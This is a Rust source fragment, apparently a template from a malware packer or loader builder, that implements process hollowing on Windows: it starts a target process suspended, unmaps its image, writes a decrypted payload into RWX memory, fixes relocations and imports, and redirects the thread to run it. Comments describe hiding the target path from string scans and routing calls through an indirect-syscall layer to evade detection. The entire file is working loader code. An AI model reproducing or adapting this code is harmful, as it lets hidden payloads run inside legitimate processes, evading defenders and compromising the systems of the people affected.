// --- Process hollowing (technique fragment) ---

use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{
    CreateProcessA, GetExitCodeProcess, WaitForSingleObject, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTUPINFOA,
};

// The kernel-facing calls (NtAllocateVirtualMemory, NtWriteVirtualMemory,
// NtReadVirtualMemory, NtResumeThread, NtUnmapViewOfSection) go through the
// `nt_*` helpers provided by the syscall layer, so this fragment is identical
// for `build.stub.syscalls.mode: none` and `build.stub.syscalls.mode: indirect`.

// --- PE constants ---
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;

/// Minimal section header view.
struct Section {
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
}

/// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT`
/// on x64; the `windows` binding only guarantees 8, so force it here.
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Minimal PE view.
struct Pe {
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<Section>,
    reloc_rva: u32,
    reloc_size: u32,
    import_rva: u32,
    import_size: u32,
}

/// Runs the decrypted payload via process hollowing and returns its exit code.
///
/// The hollowing target path is substituted at build time by
/// `Params::render_fragment` with code that rebuilds the string at runtime, so
/// it never appears in `strings`.
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    let hollow_target = $HOLLOW_TARGET_DEF$;
    let pe = parse_pe(image)?;
    let process = run_stage_two(&hollow_target, image, &pe)?;
    Ok(wait_and_exit(process))
}

// --- Minimal PE parsing (offsets relative to the decrypted image) ---

fn parse_pe(image: &[u8]) -> Result<Pe, String> {
    if image.len() < 64 {
        return Err("payload too small to be a PE".to_string());
    }
    if read_u16(image, 0)? != IMAGE_DOS_SIGNATURE {
        return Err("invalid DOS header (missing MZ signature)".to_string());
    }
    let e_lfanew = read_u32(image, 0x3C)? as usize;
    if read_u32(image, e_lfanew)? != IMAGE_NT_SIGNATURE {
        return Err("invalid NT header (missing PE signature)".to_string());
    }

    let machine = read_u16(image, e_lfanew + 4)?;
    if machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!(
            "unsupported architecture (machine 0x{machine:04x}); expected x64"
        ));
    }

    let num_sections = read_u16(image, e_lfanew + 6)? as usize;
    let size_of_optional_header = read_u16(image, e_lfanew + 20)? as usize;

    let opt = e_lfanew + 4 + 20;
    let entry_point_rva = read_u32(image, opt + 16)?;
    let image_base = read_u64(image, opt + 24)?;
    let size_of_image = read_u32(image, opt + 56)?;
    let size_of_headers = read_u32(image, opt + 60)?;

    // Base relocation directory (data directory index 5).
    let num_dirs = read_u32(image, opt + 108)?;
    let (reloc_rva, reloc_size) = if num_dirs > 5 {
        (read_u32(image, opt + 152)?, read_u32(image, opt + 156)?)
    } else {
        (0, 0)
    };
    // Import directory (data directory index 1).
    let (import_rva, import_size) = if num_dirs > 1 {
        (read_u32(image, opt + 120)?, read_u32(image, opt + 124)?)
    } else {
        (0, 0)
    };

    let section_table = opt + size_of_optional_header;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = section_table + i * 40;
        if s + 40 > image.len() {
            return Err("section table out of bounds".to_string());
        }
        sections.push(Section {
            virtual_size: read_u32(image, s + 8)?,
            virtual_address: read_u32(image, s + 12)?,
            size_of_raw_data: read_u32(image, s + 16)?,
            pointer_to_raw_data: read_u32(image, s + 20)?,
        });
    }

    Ok(Pe {
        image_base,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
    })
}

fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
    for sec in &pe.sections {
        let size = sec.virtual_size.max(sec.size_of_raw_data);
        if rva >= sec.virtual_address && rva < sec.virtual_address + size {
            return Some((rva - sec.virtual_address + sec.pointer_to_raw_data) as usize);
        }
    }
    None
}

fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), String> {
    if pe.reloc_size == 0 {
        return Ok(());
    }
    let start = rva_to_offset(pe, pe.reloc_rva)
        .ok_or_else(|| "could not map the relocation table to a file offset".to_string())?;
    let end = start + pe.reloc_size as usize;
    if end > image.len() {
        return Err("relocation table out of bounds".to_string());
    }

    let mut off = start;
    while off + 8 <= end {
        let page_rva = read_u32(image, off)?;
        let block_size = read_u32(image, off + 4)?;
        if block_size < 8 || off + block_size as usize > end {
            return Err("malformed relocation block".to_string());
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry = read_u16(image, off + 8 + (i * 2) as usize)?;
            let typ = entry >> 12;
            let rva = page_rva + (entry & 0xFFF) as u32;
            let file_off = match rva_to_offset(pe, rva) {
                Some(o) => o,
                None => continue,
            };
            match typ {
                // IMAGE_REL_BASED_DIR64: patch a 64-bit field.
                3 => {
                    let v = read_u64(image, file_off)?;
                    write_u64(image, file_off, (v as isize + delta) as u64)?;
                }
                // IMAGE_REL_BASED_HIGHLOW: patch a 32-bit field.
                10 => {
                    let v = read_u32(image, file_off)?;
                    write_u32(image, file_off, (v as isize + delta) as u32)?;
                }
                // ABSOLUTE and everything else: skip.
                _ => {}
            }
        }
        off += block_size as usize;
    }
    Ok(())
}

/// Resolves the payload's import table and writes the resulting addresses into
/// the image's IAT (in place, so the following `write_image` ships them to the
/// target).
///
/// `LoadLibraryA`/`GetProcAddress` run in the *current* process: the system
/// DLLs are mapped at one base per session, so their addresses are also valid
/// in the target as long as the target has the DLL mapped. Imports that cannot
/// be resolved abort here, before the thread is redirected (the payload must
/// never start with a half-filled IAT).
fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<(), String> {
    let imports = crate::resolve_imports(image, pe.import_rva, pe.import_size, |rva| {
        rva_to_offset(pe, rva)
    })
    .map_err(|e| format!("could not resolve the payload's imports: {e}"))?;

    for (iat_rva, address) in imports {
        let offset = rva_to_offset(pe, iat_rva)
            .ok_or_else(|| format!("the IAT slot at RVA 0x{iat_rva:08x} is not mapped"))?;
        write_u64(image, offset, address)?;
    }
    Ok(())
}

fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, String> {
    // 1. Create the target process suspended.
    let (process, thread) = spawn_suspended(target)?;

    // 2. Read its image base from the PEB.
    let base = resolve_image_base(process, thread)?;

    // 3. Unmap the original image.
    let status = crate::nt_unmap_view(process, base as *mut core::ffi::c_void);
    if status < 0 {
        return Err(format!("unmap failed (0x{:08x})", status as u32));
    }

    // 4. Re-allocate memory at the same base. The helper writes the actual
    //    base back through `address` (it may differ from the preferred one).
    let mut address = base as *mut core::ffi::c_void;
    let mut region_size = pe.size_of_image as usize;
    let status = crate::nt_alloc_vm(
        process,
        &mut address,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_EXECUTE_READWRITE.0,
    );
    if status < 0 {
        return Err(format!("allocation failed (0x{:08x})", status as u32));
    }
    let address = address as u64;

    // 5. Fix up relocations if the base differs from the preferred one.
    let delta = address as isize - pe.image_base as isize;
    if delta != 0 {
        apply_relocations(image, pe, delta)?;
    }

    // 6. Resolve the payload's imports and fill in its IAT. The addresses are
    //    resolved in this process: the system DLLs share one base per session,
    //    so a resolved address is valid in the target as well (as long as the
    //    target has that DLL mapped — see the technique's README). Any failure
    //    aborts before the thread is redirected, so the payload never runs with
    //    a half-filled IAT.
    resolve_and_patch_imports(image, pe)?;

    // 7. Write the image (with the resolved IAT already in place).
    write_image(process, address, image, pe)?;

    // 8. Redirect the thread to the payload entry point.
    redirect_entry(thread, address, pe.entry_point_rva)?;

    // 9. Resume the thread and keep only the process handle.
    let mut previous = 0u32;
    let status = crate::nt_resume_thread(thread, &mut previous);
    if status < 0 {
        return Err(format!("resume failed (0x{:08x})", status as u32));
    }
    unsafe {
        let _ = CloseHandle(thread);
    }

    Ok(process)
}

fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
    let mut app = target.as_bytes().to_vec();
    app.push(0);
    let mut cmd = app.clone();

    let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(cmd.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &startup,
            &mut pi,
        )
    }
    .map_err(|e| format!("CreateProcessA failed: {e}"))?;

    Ok((pi.hProcess, pi.hThread))
}

fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe { GetThreadContext(thread, &mut ctx.0) }
        .map_err(|e| format!("GetThreadContext failed: {e}"))?;

    // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
    let peb = ctx.0.Rdx;
    let mut base: u64 = 0;
    let mut read = 0usize;
    let status = crate::nt_read_vm(
        process,
        (peb + 0x10) as *const core::ffi::c_void,
        &mut base as *mut u64 as *mut core::ffi::c_void,
        std::mem::size_of::<u64>(),
        &mut read,
    );
    if status < 0 {
        return Err(format!("image base read failed (0x{:08x})", status as u32));
    }

    Ok(base)
}

fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
    // Headers first.
    write_remote(process, base, &image[..pe.size_of_headers as usize])?;
    // Then each section.
    for sec in &pe.sections {
        let start = sec.pointer_to_raw_data as usize;
        let end = start + sec.size_of_raw_data as usize;
        if end > image.len() {
            return Err("section data out of bounds".to_string());
        }
        write_remote(
            process,
            base + sec.virtual_address as u64,
            &image[start..end],
        )?;
    }
    Ok(())
}

fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
    if data.is_empty() {
        return Ok(());
    }
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        base as *const core::ffi::c_void,
        data.as_ptr() as *const core::ffi::c_void,
        data.len(),
        &mut written,
    );
    if status < 0 {
        return Err(format!("write failed (0x{:08x})", status as u32));
    }
    Ok(())
}

fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe { GetThreadContext(thread, &mut ctx.0) }
        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
    ctx.0.Rcx = base + entry_rva as u64;
    unsafe { SetThreadContext(thread, &ctx.0) }
        .map_err(|e| format!("SetThreadContext failed: {e}"))?;
    Ok(())
}

fn wait_and_exit(process: HANDLE) -> i32 {
    unsafe {
        let _ = WaitForSingleObject(process, u32::MAX);
        let mut code: u32 = 0;
        let _ = GetExitCodeProcess(process, &mut code);
        let _ = CloseHandle(process);
        code as i32
    }
}

// --- Bounds-checked little-endian reads/writes ---

fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
    let s = b
        .get(
            off..off
                .checked_add(2)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u16::from_le_bytes([s[0], s[1]]))
}

fn read_u32(b: &[u8], off: usize) -> Result<u32, String> {
    let s = b
        .get(
            off..off
                .checked_add(4)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn read_u64(b: &[u8], off: usize) -> Result<u64, String> {
    let s = b
        .get(
            off..off
                .checked_add(8)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

fn write_u32(b: &mut [u8], off: usize, v: u32) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(4)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "write out of bounds".to_string())?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}

fn write_u64(b: &mut [u8], off: usize, v: u64) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(8)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "write out of bounds".to_string())?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}
